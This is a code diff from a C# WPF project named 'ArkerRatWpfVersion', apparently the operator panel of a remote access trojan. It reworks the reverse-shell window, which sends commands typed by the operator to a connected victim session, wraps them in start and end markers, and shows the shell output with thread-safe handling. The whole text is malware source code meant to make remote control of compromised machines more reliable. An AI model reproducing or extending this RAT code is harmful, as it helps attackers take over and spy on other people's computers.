@@ -29,11 +29,16 @@ namespace ArkerRatWpfVersion
             reverseShellTextOutput.IsReadOnly = true;
             clientSession = session;
             clientSession.reverseShellWindowIsAlreadyOpen = true;
-            clientSession.SendData("§ReverseShell§");
+            clientSession.SendData("§ReverseShellStart§§ReverseShellEnd§");
+
+            lock (GlobalVariables._lock)
+            {
+                clientSession.data = string.Empty;
+            }
         }
         private async void CloseReverseShell(object sender, RoutedEventArgs e)
         {
-            await clientSession.SendData("§ReverseShell§§close§");
+            await clientSession.SendData("§ReverseShellStart§close§ReverseShellEnd§");
             clientSession.reverseShellWindowIsAlreadyOpen = false;
             Close();
         }
@@ -56,24 +61,23 @@ namespace ArkerRatWpfVersion
 
         }
 
-        public string data = "";
-        private string checkIfDataIsNew = "1";
-        public async Task ReversShellFunction()
+        public async Task ReversShellFunction(string data)
         {
-            if (data.Length > 1 && data != checkIfDataIsNew)
+            lock (GlobalVariables._lock)
             {
-                reverseShellTextOutput.AppendText(data);
-                reverseShellTextOutput.ScrollToEnd();
-                checkIfDataIsNew = data;
+                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    reverseShellTextOutput.AppendText(data);
+                }));
             }
-
+            reverseShellTextOutput.ScrollToEnd();
         }
 
         private async void EnterPressed(object sender, KeyEventArgs e)
         {
             if(e.Key == Key.Enter)
             {
-                await clientSession.SendData(reverseShellTextInput.Text+"§ReverseShell§");
+                await clientSession.SendData("§ReverseShellStart§"+reverseShellTextInput.Text+"§ReverseShellEnd§");
                 reverseShellTextInput.Clear();
             }
         }
